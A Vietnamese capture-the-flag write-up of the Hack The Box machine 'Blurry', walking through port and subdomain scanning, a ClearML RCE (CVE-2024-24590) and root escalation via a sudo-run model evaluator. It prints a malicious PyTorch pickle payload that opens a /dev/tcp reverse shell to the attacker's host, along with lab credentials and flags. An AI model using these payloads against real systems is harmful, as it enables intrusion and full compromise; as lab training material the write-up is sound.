# Blurry

<img width="1385" height="610" alt="image" src="https://github.com/user-attachments/assets/ca009d9a-0072-4e29-9284-880e87835146" />

Đầu tiên thì tôi dùng nmap để scan port:
```
❯ sudo nmap -sV -p- 10.10.11.19
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-24 20:14 +0700
Nmap scan report for app.blurry.htb (10.10.11.19)
Host is up (0.072s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.22 seconds
```
Truy cập vào thì có giao diện như này:

<img width="1871" height="957" alt="image" src="https://github.com/user-attachments/assets/5c6e8d3e-d6e2-4783-a1bc-56f5fc83a248" />

Khám phá thì thấy đây là phiên bản `1.13.1-426`, search google thì thấy `CVE-2024-24590` dẫn đến RCE:

<img width="1865" height="965" alt="image" src="https://github.com/user-attachments/assets/2823fc28-7e14-448c-a3a8-e0e27e14f36d" />

Nhưng cần nạn nhân tải model về, ở đây có 4 cái model:

<img width="1759" height="899" alt="image" src="https://github.com/user-attachments/assets/9fb453b0-e0b5-42ad-b73f-bf6c292853b6" />

Tiếp tục thì tôi fuzzing subdomain thì ra được 4 cái, cái api vẫn vào được nhưng lại trả về 400:

```
❯ ffuf -u http://app.blurry.htb/ -H 'Host: FUZZ.blurry.htb' -w ~/wordlist/subdomains-top1mil-20000.txt -mc 200,301,302,307,400,401,403 -ac -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://app.blurry.htb/
 :: Wordlist         : FUZZ: /home/namdeptrai/wordlist/subdomains-top1mil-20000.txt
 :: Header           : Host: FUZZ.blurry.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,301,302,307,400,401,403
________________________________________________

files                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 47ms]
chat                    [Status: 200, Size: 218733, Words: 12692, Lines: 449, Duration: 67ms]
app                     [Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 40ms]
```

Ở `files` thì không có thấy gì, truy cập vào subdomain `chat` và đăng kí tài khoản, xem được đoạn chat:

<img width="1868" height="898" alt="image" src="https://github.com/user-attachments/assets/aea66077-6248-496e-b5e0-6c1ee5a2ded8" />

Ở đây có đề cập đến review project `Black Swan`:

<img width="1524" height="844" alt="image" src="https://github.com/user-attachments/assets/16534b20-8a7d-4aaf-8bb3-964996a84446" />

Tiếp theo thì quay lại `app` và sử dụng đoạn exploit của [CVE-2024-24590](https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit)

<img width="699" height="801" alt="image" src="https://github.com/user-attachments/assets/cdd22a70-b5e5-4b01-964c-b048e192f989" />

```
api {
  web_server: http://app.blurry.htb
  api_server: http://api.blurry.htb
  files_server: http://files.blurry.htb
  credentials {
    "access_key" = "GOOYM4M64L1RENQKLGQC"
    "secret_key" = "xFATWL9uKNAeE4WM2GbFlRXGRIZ9BgWXBOmF9dV8IOEhidL8xz"
  }
}
```

Ở đây có đường dẫn bao gồm subdomain là `api`, tôi thêm nốt vào, sau đó chạy đoạn exploit đó:

<img width="1304" height="773" alt="image" src="https://github.com/user-attachments/assets/c8f5250d-316d-46d5-95ec-30a30d99ad11" />

Sau khi đợi 1 lúc ở 1234 thì đã hiện ra reverse shell:

```
❯ nc -lvp 1234
Connection from 10.10.11.19:42320
bash: cannot set terminal process group (5833): Inappropriate ioctl for device
bash: no job control in this shell
jippity@blurry:~$ cat use	
cat user.txt 
b7f1798a5e40ddeac189a53b7d88a6ef
jippity@blurry:~$ 
```

Tôi đọc `.ssh/id_rsa` và ssh vào trong server, dùng `sudo -l` thì có xuất hiện `/usr/bin/evaluate_model /models/*.pth` có thể chạy dưới quyền root mà không cần mật khẩu:

```
❯ ssh -i id_rsa jippity@10.10.11.19
Linux blurry 5.10.0-30-amd64 #1 SMP Debian 5.10.218-1 (2024-06-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Sep 24 07:25:39 2025 from 10.10.14.12
jippity@blurry:~$ sudo -l
Matching Defaults entries for jippity on blurry:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
jippity@blurry:~$ ls -la /models/
total 1068
drwxrwxr-x  2 root jippity    4096 Sep 24 07:42 .
drwxr-xr-x 19 root root       4096 Jun  3  2024 ..
-rw-r--r--  1 root root    1077880 May 30  2024 demo_model.pth
-rw-r--r--  1 root root       2547 May 30  2024 evaluate_model.py
```

Tôi mở file `/usr/bin/evaluate_model` và `/models/evaluate_model.py` thì có nội dung như này:

```
jippity@blurry:~$ cat /usr/bin/evaluate_model
#!/bin/bash
# Evaluate a given model against our proprietary dataset.
# Security checks against model file included.

if [ "$#" -ne 1 ]; then
    /usr/bin/echo "Usage: $0 <path_to_model.pth>"
    exit 1
fi

MODEL_FILE="$1"
TEMP_DIR="/opt/temp"
PYTHON_SCRIPT="/models/evaluate_model.py"  

/usr/bin/mkdir -p "$TEMP_DIR"

file_type=$(/usr/bin/file --brief "$MODEL_FILE")

# Extract based on file type
if [[ "$file_type" == *"POSIX tar archive"* ]]; then
    # POSIX tar archive (older PyTorch format)
    /usr/bin/tar -xf "$MODEL_FILE" -C "$TEMP_DIR"
elif [[ "$file_type" == *"Zip archive data"* ]]; then
    # Zip archive (newer PyTorch format)
    /usr/bin/unzip -q "$MODEL_FILE" -d "$TEMP_DIR"
else
    /usr/bin/echo "[!] Unknown or unsupported file format for $MODEL_FILE"
    exit 2
fi

/usr/bin/find "$TEMP_DIR" -type f \( -name "*.pkl" -o -name "pickle" \) -print0 | while IFS= read -r -d $'\0' extracted_pkl; do
    fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 "$extracted_pkl")

    if /usr/bin/echo "$fickling_output" | /usr/bin/jq -e 'select(.severity == "OVERTLY_MALICIOUS")' >/dev/null; then
        /usr/bin/echo "[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted."
        /bin/rm "$MODEL_FILE"
        break
    fi
done

/usr/bin/find "$TEMP_DIR" -type f -exec /bin/rm {} +
/bin/rm -rf "$TEMP_DIR"

if [ -f "$MODEL_FILE" ]; then
    /usr/bin/echo "[+] Model $MODEL_FILE is considered safe. Processing..."
    /usr/bin/python3 "$PYTHON_SCRIPT" "$MODEL_FILE"
fi

jippity@blurry:~$ cat /models/evaluate_model.py
import torch
import torch.nn as nn
from torchvision import transforms
from torchvision.datasets import CIFAR10
from torch.utils.data import DataLoader, Subset
import numpy as np
import sys


class CustomCNN(nn.Module):
    def __init__(self):
        super(CustomCNN, self).__init__()
        self.conv1 = nn.Conv2d(in_channels=3, out_channels=16, kernel_size=3, padding=1)
        self.conv2 = nn.Conv2d(in_channels=16, out_channels=32, kernel_size=3, padding=1)
        self.pool = nn.MaxPool2d(kernel_size=2, stride=2, padding=0)
        self.fc1 = nn.Linear(in_features=32 * 8 * 8, out_features=128)
        self.fc2 = nn.Linear(in_features=128, out_features=10)
        self.relu = nn.ReLU()

    def forward(self, x):
        x = self.pool(self.relu(self.conv1(x)))
        x = self.pool(self.relu(self.conv2(x)))
        x = x.view(-1, 32 * 8 * 8)
        x = self.relu(self.fc1(x))
        x = self.fc2(x)
        return x


def load_model(model_path):
    model = CustomCNN()
    
    state_dict = torch.load(model_path)
    model.load_state_dict(state_dict)
    
    model.eval()  
    return model

def prepare_dataloader(batch_size=32):
    transform = transforms.Compose([
	transforms.RandomHorizontalFlip(),
	transforms.RandomCrop(32, padding=4),
        transforms.ToTensor(),
        transforms.Normalize(mean=[0.4914, 0.4822, 0.4465], std=[0.2023, 0.1994, 0.2010]),
    ])
    
    dataset = CIFAR10(root='/root/datasets/', train=False, download=False, transform=transform)
    subset = Subset(dataset, indices=np.random.choice(len(dataset), 64, replace=False))
    dataloader = DataLoader(subset, batch_size=batch_size, shuffle=False)
    return dataloader

def evaluate_model(model, dataloader):
    correct = 0
    total = 0
    with torch.no_grad():  
        for images, labels in dataloader:
            outputs = model(images)
            _, predicted = torch.max(outputs.data, 1)
            total += labels.size(0)
            correct += (predicted == labels).sum().item()
    
    accuracy = 100 * correct / total
    print(f'[+] Accuracy of the model on the test dataset: {accuracy:.2f}%')

def main(model_path):
    model = load_model(model_path)
    print("[+] Loaded Model.")
    dataloader = prepare_dataloader()
    print("[+] Dataloader ready. Evaluating model...")
    evaluate_model(model, dataloader)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python script.py <path_to_model.pth>")
    else:
        model_path = sys.argv[1]  # Path to the .pth file
        main(model_path)
```

Tóm tắt lại thì:

Bash: kiểm tra định dạng, extract, quét pickle bằng Fickling, rồi mới gọi Python.

Python: load model theo đường dẫn.

Tôi sử dụng đoạn script, lợi dụng `__reduce__`, method này cho phép tuần tự hóa tùy chỉnh, kiểm soát việc tái cấu trúc đối tượng và có thể cải thiện hiệu suất. 
Phương pháp này là một phần của giao thức pickle của Python và rất cần thiết cho tính bền vững của đối tượng phức tạp.

```
import os
import torch

class RevShell:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/10.10.14.12/1234 0>&1'",))

torch.save(RevShell(), 'test.pth')

```

Khi đoạn python kia gọi đến `load` thì nó sẽ thực thi `os.system` với command `bash -c 'bash -i >& /dev/tcp/10.10.14.12/1234 0>&1'` chạy reverse shell

Thực thi đoạn script với file `test.pth` được truyền vào 
```
jippity@blurry:~$ ls -la /models/
total 1068
drwxrwxr-x  2 root jippity    4096 Sep 24 07:42 .
drwxr-xr-x 19 root root       4096 Jun  3  2024 ..
-rw-r--r--  1 root root    1077880 May 30  2024 demo_model.pth
-rw-r--r--  1 root root       2547 May 30  2024 evaluate_model.py
jippity@blurry:~$ python3 save-torch.py 
jippity@blurry:~$ cp test.pth /models/
jippity@blurry:~$ ls -la /models/
total 1072
drwxrwxr-x  2 root    jippity    4096 Sep 24 09:42 .
drwxr-xr-x 19 root    root       4096 Jun  3  2024 ..
-rw-r--r--  1 root    root    1077880 May 30  2024 demo_model.pth
-rw-r--r--  1 root    root       2547 May 30  2024 evaluate_model.py
-rw-r--r--  1 jippity jippity     916 Sep 24 09:42 test.pth
jippity@blurry:~$ sudo /usr/bin/evaluate_model /models/test.pth 
[+] Model /models/test.pth is considered safe. Processing...
```
Lúc này nhận được reverse shell:
```
❯ nc -lvp 1234
Connection from 10.10.11.19:40772
root@blurry:/home/jippity# cat /root/roo	
cat /root/root.txt 
cb0766cd7fffe338f46ba83f883e8799
root@blurry:/home/jippity# 
```
